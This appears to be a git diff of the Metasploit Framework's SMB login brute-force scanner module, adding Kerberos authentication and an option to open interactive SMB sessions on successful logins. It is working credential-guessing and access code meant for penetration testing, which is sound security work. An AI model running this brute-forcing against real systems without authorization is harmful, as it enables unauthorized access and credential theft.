@@ -14,41 +14,45 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::AuthBrute
+  include Msf::Auxiliary::CommandShell
+  include Msf::Sessions::CreateSessionOptions
+  include Msf::Auxiliary::ReportSummary
 
   Aliases = [
     'auxiliary/scanner/smb/login'
-  ]
+  ].freeze
 
   def proto
     'smb'
   end
+
   def initialize
     super(
-      'Name'           => 'SMB Login Check Scanner',
-      'Description'    => %q{
+      'Name' => 'SMB Login Check Scanner',
+      'Description' => %q{
         This module will test a SMB login on a range of machines and
         report successful logins.  If you have loaded a database plugin
         and connected to a database this module will record successful
         logins and hosts so you can track your access.
       },
-      'Author'         =>
-        [
-          'tebo <tebo[at]attackresearch.com>', # Original
-          'Ben Campbell', # Refactoring
-          'Brandon McCann "zeknox" <bmccann[at]accuvant.com>', # admin check
-          'Tom Sellers <tom[at]fadedcode.net>' # admin check/bug fix
-        ],
-      'References'     =>
-        [
-          [ 'CVE', '1999-0506'], # Weak password
-        ],
-      'License'     => MSF_LICENSE,
-      'DefaultOptions' =>
-        {
-          'DB_ALL_CREDS'    => false,
-          'BLANK_PASSWORDS' => false,
-          'USER_AS_PASS'    => false
-        }
+      'Author' => [
+        'tebo <tebo[at]attackresearch.com>', # Original
+        'Ben Campbell', # Refactoring
+        'Brandon McCann "zeknox" <bmccann[at]accuvant.com>', # admin check
+        'Tom Sellers <tom[at]fadedcode.net>' # admin check/bug fix
+      ],
+      'References' => [
+        [ 'CVE', '1999-0506'], # Weak password
+        [ 'ATT&CK', Mitre::Attack::Technique::T1021_002_SMB_WINDOWS_ADMIN_SHARES ],
+        [ 'ATT&CK', Mitre::Attack::Technique::T1110_BRUTE_FORCE ],
+      ],
+      'License' => MSF_LICENSE,
+      'DefaultOptions' => {
+        'DB_ALL_CREDS' => false,
+        'BLANK_PASSWORDS' => false,
+        'USER_AS_PASS' => false,
+        'CreateSession' => false
+      }
     )
 
     # These are normally advanced options, but for this module they have a
@@ -56,42 +60,116 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         Opt::Proxies,
-        OptBool.new('ABORT_ON_LOCKOUT', [ true, "Abort the run when an account lockout is detected", false ]),
-        OptBool.new('PRESERVE_DOMAINS', [ false, "Respect a username that contains a domain name.", true ]),
-        OptBool.new('RECORD_GUEST', [ false, "Record guest-privileged random logins to the database", false ]),
+        OptBool.new('ABORT_ON_LOCKOUT', [ true, 'Abort the run when an account lockout is detected', false ]),
+        OptBool.new('PRESERVE_DOMAINS', [ false, 'Respect a username that contains a domain name.', true ]),
+        OptBool.new('RECORD_GUEST', [ false, 'Record guest-privileged random logins to the database', false ]),
         OptBool.new('DETECT_ANY_AUTH', [false, 'Enable detection of systems accepting any authentication', false]),
-        OptBool.new('DETECT_ANY_DOMAIN', [false, 'Detect if domain is required for the specified user', false])
-      ])
+        OptBool.new('DETECT_ANY_DOMAIN', [false, 'Detect if domain is required for the specified user', false]),
+        OptBool.new('CreateSession', [false, 'Create a new session for every successful login', false])
+      ]
+    )
 
-    deregister_options('USERNAME','PASSWORD', 'PASSWORD_SPRAY')
+    options_to_deregister = %w[USERNAME PASSWORD CommandShellCleanupCommand AutoVerifySession KrbCacheMode]
+
+    if framework.features.enabled?(Msf::FeatureManager::SMB_SESSION_TYPE)
+      add_info('New in Metasploit 6.4 - The %grnCreateSession%clr option within this module can open an interactive session')
+    else
+      # Don't give the option to create a session unless smb sessions are enabled
+      options_to_deregister << 'CreateSession'
+    end
+
+    deregister_options(*options_to_deregister)
+  end
+
+  def create_session?
+    # The CreateSession option is de-registered if SMB_SESSION_TYPE is not enabled
+    # but the option can still be set/saved so check to see if we should use it
+    if framework.features.enabled?(Msf::FeatureManager::SMB_SESSION_TYPE)
+      datastore['CreateSession']
+    else
+      false
+    end
+  end
+
+  def run
+    results = super
+    logins = results.flat_map { |_k, v| v[:successful_logins] }
+    sessions = results.flat_map { |_k, v| v[:successful_sessions] }
+    print_status("Bruteforce completed, #{logins.size} #{logins.size == 1 ? 'credential was' : 'credentials were'} successful.")
+    return results unless framework.features.enabled?(Msf::FeatureManager::SMB_SESSION_TYPE)
+
+    if create_session?
+      print_status("#{sessions.size} SMB #{sessions.size == 1 ? 'session was' : 'sessions were'} opened successfully.")
+    else
+      print_status('You can open an SMB session with these credentials and %grnCreateSession%clr set to true')
+    end
+    results
   end
 
   def run_host(ip)
-    print_brute(:level => :vstatus, :ip => ip, :msg => "Starting SMB login bruteforce")
+    print_brute(level: :vstatus, ip: ip, msg: 'Starting SMB login bruteforce')
 
-    domain = datastore['SMBDomain'] || ""
+    domain = datastore['SMBDomain'] || ''
+
+    kerberos_authenticator_factory = nil
+    if datastore['SMB::Auth'] == Msf::Exploit::Remote::AuthOption::KERBEROS
+      fail_with(Msf::Exploit::Failure::BadConfig, 'The Smb::Rhostname option is required when using Kerberos authentication.') if datastore['Smb::Rhostname'].blank?
+      fail_with(Msf::Exploit::Failure::BadConfig, 'The SMBDomain option is required when using Kerberos authentication.') if datastore['SMBDomain'].blank?
+      fail_with(Msf::Exploit::Failure::BadConfig, 'The DomainControllerRhost is required when using Kerberos authentication.') if datastore['DomainControllerRhost'].blank?
+
+      if datastore['SMBPass'].blank?
+        # In case no password has been provided, we assume the user wants to use Kerberos tickets stored in cache
+        # Write mode is still enable in case new TGS tickets are retrieved.
+        ticket_storage = kerberos_ticket_storage({ read: true, write: true })
+      else
+        # Write only cache so we keep all gathered tickets but don't reuse them for auth while running the module
+        ticket_storage = kerberos_ticket_storage({ read: false, write: true })
+      end
+
+      kerberos_authenticator_factory = lambda do |username, password, realm|
+        Msf::Exploit::Remote::Kerberos::ServiceAuthenticator::SMB.new(
+          host: datastore['DomainControllerRhost'],
+          hostname: datastore['Smb::Rhostname'],
+          proxies: datastore['Proxies'],
+          realm: realm,
+          username: username,
+          password: password,
+          framework: framework,
+          framework_module: self,
+          cache_file: datastore['Smb::Krb5Ccname'].blank? ? nil : datastore['Smb::Krb5Ccname'],
+          ticket_storage: ticket_storage,
+          clock_skew: kerberos_clock_skew_seconds
+        )
+      end
+    end
 
     @scanner = Metasploit::Framework::LoginScanner::SMB.new(
-      host: ip,
-      port: rport,
-      local_port: datastore['CPORT'],
-      stop_on_success: datastore['STOP_ON_SUCCESS'],
-      proxies: datastore['PROXIES'],
-      bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
-      connection_timeout: 5,
-      max_send_size: datastore['TCP::max_send_size'],
-      send_delay: datastore['TCP::send_delay'],
-      framework: framework,
-      framework_module: self,
+      configure_login_scanner(
+        host: ip,
+        port: rport,
+        local_port: datastore['CPORT'],
+        stop_on_success: datastore['STOP_ON_SUCCESS'],
+        proxies: datastore['Proxies'],
+        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
+        connection_timeout: 5,
+        max_send_size: datastore['TCP::max_send_size'],
+        send_delay: datastore['TCP::send_delay'],
+        framework: framework,
+        framework_module: self,
+        always_encrypt: datastore['SMB::AlwaysEncrypt'],
+        versions: datastore['SMB::ProtocolVersion'].split(',').map(&:strip).reject(&:blank?).map(&:to_i),
+        kerberos_authenticator_factory: kerberos_authenticator_factory,
+        use_client_as_proof: create_session?
+      )
     )
 
     if datastore['DETECT_ANY_AUTH']
       bogus_result = @scanner.attempt_bogus_login(domain)
       if bogus_result.success?
         if bogus_result.access_level == Metasploit::Framework::LoginScanner::SMB::AccessLevels::GUEST
-          print_status("This system allows guest sessions with random credentials")
+          print_status('This system allows guest sessions with random credentials')
         else
-          print_error("This system accepts authentication with random credentials, brute force is ineffective.")
+          print_error('This system accepts authentication with random credentials, brute force is ineffective.')
           return
         end
       else
@@ -99,60 +177,64 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
 
-    cred_collection = Metasploit::Framework::CredentialCollection.new(
-      blank_passwords: datastore['BLANK_PASSWORDS'],
-      pass_file: datastore['PASS_FILE'],
-      password: datastore['SMBPass'],
-      user_file: datastore['USER_FILE'],
-      userpass_file: datastore['USERPASS_FILE'],
-      username: datastore['SMBUser'],
-      user_as_pass: datastore['USER_AS_PASS'],
+    cred_collection = build_credential_collection(
       realm: domain,
+      username: datastore['SMBUser'],
+      password: datastore['SMBPass'],
+      nil_passwords: datastore['SMB::Auth'] == Msf::Exploit::Remote::AuthOption::KERBEROS && datastore['SMBPass'].blank?
     )
-
-    cred_collection = prepend_db_passwords(cred_collection)
     cred_collection = prepend_db_hashes(cred_collection)
-    cred_collection = prepend_db_usernames(cred_collection)
 
     @scanner.cred_details = cred_collection
-
+    successful_logins = []
+    successful_sessions = []
     @scanner.scan! do |result|
       case result.status
       when Metasploit::Model::Login::Status::LOCKED_OUT
         if datastore['ABORT_ON_LOCKOUT']
           print_error("Account lockout detected on '#{result.credential.public}', aborting.")
-          return
+          break
         else
           print_error("Account lockout detected on '#{result.credential.public}', skipping this user.")
         end
 
       when Metasploit::Model::Login::Status::DENIED_ACCESS
-        print_brute :level => :status, :ip => ip, :msg => "Correct credentials, but unable to login: '#{result.credential}', #{result.proof}"
+        print_brute level: :status, ip: ip, msg: "Correct credentials, but unable to login: '#{result.credential}', #{result.proof}"
         report_creds(ip, rport, result)
         :next_user
       when Metasploit::Model::Login::Status::SUCCESSFUL
-        print_brute :level => :good, :ip => ip, :msg => "Success: '#{result.credential}' #{result.access_level}"
+        print_brute level: :good, ip: ip, msg: "Success: '#{result.credential}' #{result.access_level}"
+        successful_logins << result
         report_creds(ip, rport, result)
+        if create_session?
+          begin
+            successful_sessions << session_setup(result)
+          rescue ::StandardError => e
+            elog('Failed to setup the session', error: e)
+            print_brute level: :error, ip: ip, msg: "Failed to setup the session - #{e.class} #{e.message}"
+            result.connection.close unless result.connection.nil?
+          end
+        end
         :next_user
       when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
         if datastore['VERBOSE']
-          print_brute :level => :verror, :ip => ip, :msg => "Could not connect"
+          print_brute level: :verror, ip: ip, msg: 'Could not connect'
         end
         invalidate_login(
-            address: ip,
-            port: rport,
-            protocol: 'tcp',
-            public: result.credential.public,
-            private: result.credential.private,
-            realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
-            realm_value: result.credential.realm,
-            last_attempted_at: DateTime.now,
-            status: result.status
+          address: ip,
+          port: rport,
+          protocol: 'tcp',
+          public: result.credential.public,
+          private: result.credential.private,
+          realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
+          realm_value: result.credential.realm,
+          last_attempted_at: DateTime.now,
+          status: result.status
         )
         :abort
       when Metasploit::Model::Login::Status::INCORRECT
         if datastore['VERBOSE']
-          print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}', #{result.proof}"
+          print_brute level: :verror, ip: ip, msg: "Failed: '#{result.credential}', #{result.proof}"
         end
         invalidate_login(
           address: ip,
@@ -167,9 +249,8 @@ class MetasploitModule < Msf::Auxiliary
         )
       end
     end
-
+    { successful_logins: successful_logins, successful_sessions: successful_sessions }
   end
-
 
   # This logic is not universal ie a local account will not care about workgroup
   # but remote domain authentication will so check each instance
@@ -186,11 +267,8 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def report_creds(ip, port, result)
-    if !datastore['RECORD_GUEST']
-      if result.access_level == Metasploit::Framework::LoginScanner::SMB::AccessLevels::GUEST
-        return
-      end
-    end
+    # Private can be nil if we authenticated with Kerberos and a cached ticket was used. No need to report this.
+    return unless result.credential.private
 
     service_data = {
       address: ip,
@@ -200,19 +278,27 @@ class MetasploitModule < Msf::Auxiliary
       workspace_id: myworkspace_id
     }
 
+    report_service(
+      host: service_data[:address],
+      port: service_data[:port],
+      proto: service_data[:protocol],
+      name: service_data[:service_name]
+    )
+    return if !datastore['RECORD_GUEST'] && result.access_level == Metasploit::Framework::LoginScanner::SMB::AccessLevels::GUEST
+
     credential_data = {
-      module_fullname: self.fullname,
+      module_fullname: fullname,
       origin_type: :service,
       private_data: result.credential.private,
       private_type: (
         Rex::Proto::NTLM::Utils.is_pass_ntlm_hash?(result.credential.private) ? :ntlm_hash : :password
       ),
-      username: result.credential.public,
+      username: result.credential.public
     }.merge(service_data)
 
     if datastore['DETECT_ANY_DOMAIN'] && domain.present?
       if accepts_bogus_domains?(result.credential.public, result.credential.private)
-        print_brute(:level => :vstatus, :ip => ip, :msg => "Domain is ignored for user #{result.credential.public}")
+        print_brute(level: :vstatus, ip: ip, msg: "Domain is ignored for user #{result.credential.public}")
       else
         credential_data.merge!(
           realm_key: Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN,
@@ -232,4 +318,22 @@ class MetasploitModule < Msf::Auxiliary
 
     create_credential_login(login_data)
   end
+
+  # @param [Metasploit::Framework::LoginScanner::Result] result
+  # @return [Msf::Sessions::SMB]
+  def session_setup(result)
+    return unless (result.connection && result.proof)
+
+    my_session = Msf::Sessions::SMB.new(result.connection, { client: result.proof })
+    merge_me = {
+      'USERPASS_FILE' => nil,
+      'USER_FILE' => nil,
+      'PASS_FILE' => nil,
+      'USERNAME' => result.credential.public,
+      'PASSWORD' => result.credential.private
+    }
+
+    start_session(self, nil, merge_me, false, my_session.rstream, my_session)
+  end
+
 end
